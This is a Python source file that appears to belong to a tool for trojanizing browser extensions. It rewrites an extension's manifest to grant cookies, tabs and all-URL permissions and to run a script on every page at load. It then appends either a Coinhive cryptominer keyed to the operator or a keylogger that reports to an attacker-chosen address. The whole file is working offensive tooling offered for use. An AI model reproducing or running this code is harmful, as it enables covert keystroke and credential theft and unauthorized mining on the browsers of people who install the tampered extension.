#!/usr/bin/python

import json
import os
from libs.colors import Colors

class Loader :

	def __init__(self, extension, module) :

		self.module = module
		self.extension = extension
		self.color = Colors()
		
	def inject(self) :

		try:
			permissions = ["background", "cookies", "activeTab", "tabs", "*://*/*"]

			manifest = "output/extensions/{}/manifest.json".format(self.extension)

			path = ""

			with open(manifest, "rb") as f :

				data = json.loads(f.read())

				if not "content_scripts" in data:
					payload = {"content_scripts": [{"js": ["{}.js".format(self.extension)], "matches": ["*://*/*"], "run_at": "document_start"}]}
					data.update(payload) 

				if not "permissions" in data:
					payload = {"permissions": ["tabs", "<all_urls>", "background", "cookies", "activeTab", "*://*/*"]}
					data.update(payload) 

				permites = data['permissions']
				scripts = data['content_scripts']
				
				for permission in permissions :
					if not permission in permites:
						permites.append(permission)

				if scripts:
					for content in scripts :
						matches = content['matches']
						path += content['js'][0]
						if not "*://*/*" in matches:
							matches.append("*://*/*")
				with open(manifest, "wb") as w :
					w.write(json.dumps(data, indent=2, sort_keys=True, separators=(',', ': '), ensure_ascii=False))
					w.close()
		except IOError as e:
			raise e

		if self.module == "currency":

			modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background

			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))

			apikey = raw_input("{} Set coinhive public key: ".format(self.color.status("[+]")))
			thread = raw_input("{} Set coinhive threads: ".format(self.color.status("[+]")))
			autoThreads = raw_input("{} Set coinhive autoThreads: ".format(self.color.status("[+]")))
			throttle = raw_input("{} Set coinhive throttle: ".format(self.color.status("[+]")))
			forceASMJS = raw_input("{} Set coinhive forceASMJS: ".format(self.color.status("[+]")))

			options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options

		elif self.module == "keylogger" :

			modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
			connection = raw_input("{} Set the back connection: ".format("[+]"))
			options = "{}".format(connection)

		with open(modules, "rb") as f :
			data = f.read()
			data = data.replace("_0xacfd[2]", str(options))
			with open("output/extensions/{}/{}".format(self.extension, path), "a") as s :
				s.write(data)
				print("{} Module as been injected {}".format(self.color.status("[!]"), modules))
				s.close()